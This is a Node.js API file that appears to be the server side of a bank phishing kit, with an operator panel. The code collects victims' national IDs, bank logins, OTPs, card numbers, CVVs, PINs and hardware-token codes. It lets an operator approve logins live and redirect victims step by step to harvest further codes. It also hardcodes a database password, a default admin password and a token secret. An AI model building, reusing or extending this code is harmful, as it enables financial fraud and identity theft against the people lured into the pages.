const crypto = require('crypto');
const { Pool } = require('pg');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin1234@@';
const TOKEN_SECRET = process.env.TOKEN_SECRET || 'halyg-admin-secret-key-2026';
const DATABASE_URL = process.env.DATABASE_URL || 'postgresql://postgres.kyqifzzmuxwvicjlejfx:HaH0987%40%40%23%23@aws-0-eu-west-1.pooler.supabase.com:5432/postgres';

const pool = new Pool({
  connectionString: DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  max: 1,
  idleTimeoutMillis: 20000,
  connectionTimeoutMillis: 10000
});

const CACHE_TTL = 0;
const _cache = {};
function cached(key, ttlMs, fn) {
  const entry = _cache[key];
  if (entry && Date.now() - entry.ts < ttlMs) return Promise.resolve(entry.data);
  return fn().then(data => { _cache[key] = { data, ts: Date.now() }; return data; });
}
function clearCache(prefix) {
  for (const k of Object.keys(_cache)) if (!prefix || k.startsWith(prefix)) delete _cache[k];
}

async function loadApps() {
  return cached('store.apps', CACHE_TTL, async () => {
    const { rows } = await pool.query('SELECT id, data FROM halyg_apps');
    const apps = {};
    for (const row of rows) apps[row.id] = row.data;
    return apps;
  });
}

async function loadVisitors() {
  return cached('store.visitors', CACHE_TTL, async () => {
    const { rows } = await pool.query('SELECT id, data FROM halyg_visitors');
    const visitors = {};
    for (const row of rows) visitors[row.id] = row.data;
    return visitors;
  });
}

async function saveApp(nationalId, data) {
  await pool.query(
    `INSERT INTO halyg_apps (id, data) VALUES ($1, $2)
     ON CONFLICT (id) DO UPDATE SET data = $2`,
    [nationalId, JSON.stringify(data)]
  );
  clearCache('store.apps');
  clearCache('admin.');
}

async function deleteAppEntry(nationalId) {
  await pool.query('DELETE FROM halyg_apps WHERE id = $1', [nationalId]);
  clearCache('store.apps');
  clearCache('admin.');
}

async function saveVisitor(sessionId, data) {
  await pool.query(
    `INSERT INTO halyg_visitors (id, data) VALUES ($1, $2)
     ON CONFLICT (id) DO UPDATE SET data = $2`,
    [sessionId, JSON.stringify(data)]
  );
  clearCache('store.visitors');
  clearCache('admin.');
}

function makeToken() {
  return crypto.createHmac('sha256', TOKEN_SECRET).update(ADMIN_PASSWORD).digest('hex');
}
function verifyToken(token) { return token && token === makeToken(); }
function getCookies(h) {
  return (h || '').split(';').reduce((a, c) => { const i = c.indexOf('='); if (i > 0) a[c.slice(0, i).trim()] = c.slice(i + 1).trim(); return a; }, {});
}
function isAdminReq(req) {
  const cookies = getCookies(req.headers.cookie);
  return verifyToken(req.headers['x-admin-token'] || cookies['admin_session']);
}

async function getSettings() {
  return cached('store.settings', CACHE_TTL, async () => {
    const { rows } = await pool.query('SELECT key, value FROM halyg_settings');
    const defaults = { whatsappLink: '', totalVisitors: 0, appIdCounter: 10000, visitorIdCounter: 120000 };
    const settings = { ...defaults };
    for (const row of rows) {
      const num = Number(row.value);
      settings[row.key] = isNaN(num) ? row.value : num;
    }
    return settings;
  });
}

async function updateSetting(key, value) {
  await pool.query(
    `INSERT INTO halyg_settings (key, value) VALUES ($1, $2)
     ON CONFLICT (key) DO UPDATE SET value = $2`,
    [key, String(value)]
  );
  clearCache('store.settings');
}

async function getOrCreateApp(nationalId) {
  const allApps = await loadApps();
  if (allApps[nationalId]) return { ...allApps[nationalId] };

  const settings = await getSettings();
  const newId = (settings.appIdCounter || 10000) + 1;
  await updateSetting('appIdCounter', newId);

  const app = {
    id: newId, nationalId,
    fullName: '', phoneNumber: '', phone: '', address: '',
    username: '', password: '',
    otp: '', otpCode: '',
    cardNumber: '', cardExpiry: '', cvv: '', cardCvv: '',
    cardPin: '', cardName: '',
    hardToken: '', watchLink: '', watchLinkOtp: '',
    selectedWatch: '', watchColor: '',
    governorate: '',
    currentPage: 'home', status: 'active',
    redirectTo: null, redirectError: null,
    customMessage: null, loginApproved: null,
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  await saveApp(nationalId, app);
  return app;
}

async function getOrCreateVisitor(sessionId) {
  const allVisitors = await loadVisitors();
  if (allVisitors[sessionId]) return { ...allVisitors[sessionId] };

  const settings = await getSettings();
  const newTotal = (settings.totalVisitors || 0) + 1;
  await updateSetting('totalVisitors', newTotal);

  const visitor = {
    id: Date.now(), sessionId,
    currentPage: 'home', redirectTo: null,
    lastActiveAt: new Date().toISOString(),
    createdAt: new Date().toISOString(),
  };
  await saveVisitor(sessionId, visitor);
  return visitor;
}

function findAppByField(allApps, field, value) {
  for (const [nid, app] of Object.entries(allApps)) {
    if (app[field] === value) return { nid, app };
  }
  return null;
}

async function bulkUpdateApps(updates) {
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    for (const [nid, data] of Object.entries(updates)) {
      if (data === null) {
        await client.query('DELETE FROM halyg_apps WHERE id = $1', [nid]);
      } else {
        await client.query(
          `INSERT INTO halyg_apps (id, data) VALUES ($1, $2)
           ON CONFLICT (id) DO UPDATE SET data = $2`,
          [nid, JSON.stringify(data)]
        );
      }
    }
    await client.query('COMMIT');
  } catch (e) {
    await client.query('ROLLBACK');
    throw e;
  } finally {
    client.release();
  }
  clearCache('store.apps');
  clearCache('admin.');
}

async function deleteAllApps() {
  await pool.query('DELETE FROM halyg_apps');
  clearCache('store.apps');
  clearCache('admin.');
}

async function executeProcedure(name, input, isAdmin) {
  switch (name) {
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = await getOrCreateVisitor(sessionId);
        v.lastActiveAt = new Date().toISOString();
        if (currentPage || page) v.currentPage = currentPage || page;
        await saveVisitor(sessionId, v);
      }
      return { success: true };
    }
    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      if (!sessionId) return { redirectTo: null };
      const allVisitors = await loadVisitors();
      const v = allVisitors[sessionId];
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }
    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId) {
        const allVisitors = await loadVisitors();
        if (allVisitors[sessionId]) {
          const v = { ...allVisitors[sessionId], redirectTo: null, lastActiveAt: new Date().toISOString() };
          await saveVisitor(sessionId, v);
        }
      }
      return { success: true };
    }
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      if (!nationalId) return { redirectTo: null, redirectError: null };
      const allApps = await loadApps();
      const app = allApps[nationalId];
      return { redirectTo: app ? (app.redirectTo || null) : null, redirectError: app ? (app.redirectError || null) : null };
    }
    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], redirectTo: null, redirectError: null, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      if (!nationalId) return { message: null };
      const allApps = await loadApps();
      const app = allApps[nationalId];
      return { message: app ? (app.customMessage || null) : null };
    }
    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], customMessage: null };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], currentPage: page || allApps[nationalId].currentPage, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, phoneNumber, address, governorate, watchColor } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      const ph = phone || phoneNumber;
      if (ph) { app.phone = ph; app.phoneNumber = ph; }
      if (address) app.address = address;
      if (governorate) app.governorate = governorate;
      if (watchColor) { app.watchColor = watchColor; app.selectedWatch = watchColor; }
      app.currentPage = 'personal';
      app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      if (!app.fullName && username) app.fullName = username;
      app.currentPage = 'waiting-login';
      app.redirectTo = null; app.redirectError = null;
      app.loginApproved = null; app.status = 'awaiting_login'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveOtpData': {
      const { nationalId, otp, otpCode } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const code = otp || otpCode;
      if (code) { app.otp = code; app.otpCode = code; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_otp'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardCvv, cardName, cardPin, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      const cv = cvv || cardCvv;
      if (cv) { app.cvv = cv; app.cardCvv = cv; }
      if (cardName) app.cardName = cardName;
      if (cardPin) app.cardPin = cardPin;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_card'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveHardToken': {
      const { nationalId, hardToken, hardTokenCode, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const tk = hardToken || hardTokenCode || token;
      if (tk) app.hardToken = tk;
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_token'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, watchLinkOtp, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = await getOrCreateApp(nationalId);
      const wl = watchLink || watchLinkOtp || link;
      if (wl) { app.watchLink = wl; app.watchLinkOtp = wl; }
      app.currentPage = 'processing';
      app.redirectTo = null; app.redirectError = null;
      app.status = 'awaiting_watchlink'; app.updatedAt = new Date().toISOString();
      await saveApp(nationalId, app);
      return { success: true };
    }
    case 'admin.login': {
      const { password } = input;
      if (password === ADMIN_PASSWORD) return { success: true, _setToken: makeToken() };
      throw new Error('بيانات الدخول غير صحيحة');
    }
    case 'admin.checkSession': {
      return { isAdmin: !!isAdmin, authenticated: !!isAdmin };
    }
    case 'admin.logout': {
      return { success: true, _clearToken: true };
    }
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.getApps', CACHE_TTL, async () => {
        const allApps = await loadApps();
        const apps = Object.values(allApps);
        const cutoff = Date.now() - 60000;
        const activeIds = apps.filter(a => new Date(a.updatedAt).getTime() > cutoff).map(a => a.nationalId);
        const allVisitors = await loadVisitors();
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const liveVisitorCount = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff).length;
        const settings = await getSettings();
        return { apps, activeIds, liveVisitorCount, totalVisitors: settings.totalVisitors };
      });
    }
    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.liveVisitors', CACHE_TTL, async () => {
        const allVisitors = await loadVisitors();
        const visitorCutoff = new Date(Date.now() - 120000).toISOString();
        const visitors = Object.values(allVisitors).filter(v => v.lastActiveAt > visitorCutoff);
        return { visitors };
      });
    }
    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return cached('admin.allVisitors', CACHE_TTL, async () => {
        const settings = await getSettings();
        const allVisitors = await loadVisitors();
        const visitors = Object.values(allVisitors).sort((a, b) => (b.lastActiveAt || '').localeCompare(a.lastActiveAt || '')).slice(0, 200);
        return { visitors, totalCount: settings.totalVisitors };
      });
    }
    case 'admin.getWhatsAppLink': {
      const settings = await getSettings();
      return { link: settings.whatsappLink || '' };
    }
    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      await updateSetting('whatsappLink', input.link || '');
      return { success: true };
    }
    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const app = { ...allApps[nationalId], customMessage: message || null, updatedAt: new Date().toISOString() };
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], loginApproved: true, redirectTo: 'otp', currentPage: 'otp', status: 'login_approved', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], loginApproved: false, redirectTo: 'login-error', currentPage: 'login', status: 'login_rejected', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, page, redirectError, showError } = input;
      if (nationalId) {
        const allApps = await loadApps();
        if (allApps[nationalId]) {
          const dest = redirectTo || page || null;
          const app = { ...allApps[nationalId], redirectTo: dest, redirectError: redirectError || showError || null, updatedAt: new Date().toISOString() };
          if (dest) app.currentPage = dest;
          await saveApp(nationalId, app);
        }
      }
      return { success: true };
    }
    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo, page } = input;
      if (sessionId) {
        const allVisitors = await loadVisitors();
        if (allVisitors[sessionId]) {
          const v = { ...allVisitors[sessionId], redirectTo: redirectTo || page || null, lastActiveAt: new Date().toISOString() };
          await saveVisitor(sessionId, v);
        }
      }
      return { success: true };
    }
    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const updates = {};
      for (const [nid, app] of Object.entries(allApps)) {
        if (app.status === 'active' || (app.status && app.status.startsWith('awaiting'))) {
          updates[nid] = { ...app, redirectTo: input.redirectTo || 'token', updatedAt: new Date().toISOString() };
        }
      }
      if (Object.keys(updates).length > 0) {
        await bulkUpdateApps(updates);
      }
      return { success: true };
    }
    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const allApps = await loadApps();
      let nid = nationalId;
      if (!nid || !allApps[nid]) {
        if (applicationId) {
          const found = findAppByField(allApps, 'id', applicationId);
          if (found) nid = found.nid;
        }
      }
      if (nid && allApps[nid]) {
        const app = { ...allApps[nid], redirectTo: 'whatsapp', updatedAt: new Date().toISOString() };
        await saveApp(nid, app);
      }
      return { success: true };
    }
    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) {
        await deleteAppEntry(nationalId);
      } else if (applicationId) {
        const allApps = await loadApps();
        const found = findAppByField(allApps, 'id', applicationId);
        if (found) await deleteAppEntry(found.nid);
      }
      return { success: true };
    }
    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const cutoff = new Date(Date.now() - 120000).toISOString();
      const updates = {};
      let deletedCount = 0;
      for (const [nid, app] of Object.entries(allApps)) {
        if (app.updatedAt < cutoff) {
          updates[nid] = null;
          deletedCount++;
        }
      }
      if (deletedCount > 0) {
        await bulkUpdateApps(updates);
      }
      return { success: true, deletedCount };
    }
    case 'admin.deleteAllClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const allApps = await loadApps();
      const count = Object.keys(allApps).length;
      await deleteAllApps();
      return { success: true, deletedCount: count };
    }
    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      await updateSetting('totalVisitors', 0);
      return { success: true };
    }
    default:
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-token, Authorization');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const { trpc } = req.query;
  let procsStr = Array.isArray(trpc) ? trpc.join('/') : (trpc || '');
  if (!procsStr) { const m = (req.url || '').split('?')[0].match(/\/api\/trpc\/(.+)/); if (m) procsStr = decodeURIComponent(m[1]); }
  const procs = procsStr.split(',').filter(Boolean);
  if (!procs.length) return res.status(400).json([]);

  let inputs = {};
  if (req.method === 'GET') { try { inputs = JSON.parse(req.query.input || '{}'); } catch { inputs = {}; } }
  else inputs = req.body || {};

  const isAdmin = isAdminReq(req);

  let setCookie = null, clearCookie = false;

  const results = [];
  for (let i = 0; i < procs.length; i++) {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    const procName = procs[i].trim();
    try {
      const result = await executeProcedure(procName, input, isAdmin);
      if (result?._setToken) { setCookie = result._setToken; delete result._setToken; }
      if (result?._clearToken) { clearCookie = true; delete result._clearToken; }
      results.push({ result: { data: { json: result } } });
    } catch (e) {
      results.push({ error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } });
    }
  }

  if (setCookie) res.setHeader('Set-Cookie', `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`);
  if (clearCookie) res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0');
  res.setHeader('Cache-Control', 'no-store');
  return res.status(200).json(results);
};
